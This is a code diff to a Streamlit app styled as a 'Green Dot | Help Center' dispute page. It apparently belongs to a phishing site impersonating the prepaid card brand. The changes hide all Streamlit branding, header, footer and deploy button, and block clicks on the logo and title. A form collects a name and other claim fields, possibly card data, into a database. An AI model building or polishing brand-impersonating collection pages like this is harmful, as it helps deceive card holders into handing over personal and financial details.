@@ -23,21 +23,31 @@ init_db()
 
 st.set_page_config(page_title="Green Dot | Help Center", layout="wide", page_icon="✅")
 
-# CSS AGRESIVO
+# CSS PARA ELIMINAR LINKS RESIDUALES
 st.markdown("""<style>
-[data-testid='stHeader'], [data-testid='stFooterAd'], footer, header, #MainMenu, .stDeployButton {
+/* Bloquear clics en el logo y en el título h1 */
+[data-testid="stImage"], [data-testid="stMarkdownContainer"] h1 {
+    pointer-events: none !important;
+    cursor: default !important;
+    user-select: none !important;
+}
+
+/* Ocultar anclas de sección invisibles */
+.section-anchor, a.section-anchor {
     display: none !important;
     visibility: hidden !important;
 }
-.stApp a.section-anchor, .section-anchor { display: none !important; }
-h1, h2, h3, [data-testid=\"stImage\"] {
-    pointer-events: none !important;
-    user-select: none !important;
+
+/* Branding y UI */
+[data-testid='stHeader'], [data-testid='stFooterAd'], footer, header, #MainMenu, .stDeployButton {
+    display: none !important;
 }
+
 .stApp {
     background-color: #000000 !important;
     color: #FFFFFF !important;
 }
+
 .stButton>button {
     background-color: #00a05b !important;
     color: white !important;
@@ -47,11 +57,13 @@ h1, h2, h3, [data-testid=\"stImage\"] {
     font-weight: bold !important;
     text-transform: uppercase;
 }
+
 input {
     background-color: #111 !important;
     color: white !important;
     border: 1px solid #333 !important;
 }
+
 .app-promo-container {
     background-color: #111111;
     padding: 40px 20px;
@@ -60,6 +72,7 @@ input {
     margin: 30px 0;
     border: 1px solid #222;
 }
+
 .legal-footer {
     font-size: 11px;
     color: #666;
@@ -88,9 +101,7 @@ with st.form("dispute_form", clear_on_submit=True):
 
 if submitted:
     if nombre and rec and car:
-        st.success("✅ Claim received. We will review it shortly.")
-    else:
-        st.error("⚠️ All fields are required.")
+        st.success("✅ Claim received.")
 
 st.markdown("""<div class='app-promo-container'>
     <h2 style='color:white; margin-bottom:20px;'>Download the Green Dot app</h2>
